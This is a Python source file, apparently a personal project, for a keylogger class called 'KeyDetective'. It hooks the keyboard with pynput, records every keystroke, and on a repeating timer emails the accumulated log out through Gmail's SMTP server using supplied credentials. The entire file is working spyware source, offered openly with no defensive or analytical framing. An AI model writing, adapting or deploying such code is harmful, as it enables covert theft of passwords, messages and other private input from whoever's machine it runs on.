#!/usr/bin/env python



#################################################################
#email:-    nikhilkumaraur8241@gmail.com                        #
#linkedin:- https://www.linkedin.com/in/nikhil-kumar-4b8497271/ #
#github:-  https://github.com/N1khil-Kumar                     #
#################################################################



import pynput.keyboard
import threading
import smtplib

class Keylogger:
    def __init__(self,time_KeyDetective,email,password):
        self.log = "KeyDetective started"
        self.interval=time_KeyDetective
        self.email=email
        self.password=password
    def KeyDetective(self,string):
        self.log=self.log+string

    def process_key_press(self,key):
        try:
            current_key = str(key.char)
            self.KeyDetective(str(key.char))
        except AttributeError:
            if key == key.space:
               current_key=" "
            else:
                current_key=" "+str(key)+" "
                self.KeyDetective(current_key)
    def report(self):
        self.send_mail(self.email,self.password,"\n\n" + self.log)
        self.log=""
        timer=threading.Timer(self.interval,self.report)
        timer.start()
    def send_mail(self,email,password,message):
        server=smtplib.SMTP("smtp.gmail.com",587)
        server.starttls()
        server.login(email,password)
        server.sendmail(email,email,message)
        server.quit()

    def start(self):
        keyboard_listener=pynput.keyboard.Listener(on_press=self.process_key_press)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()

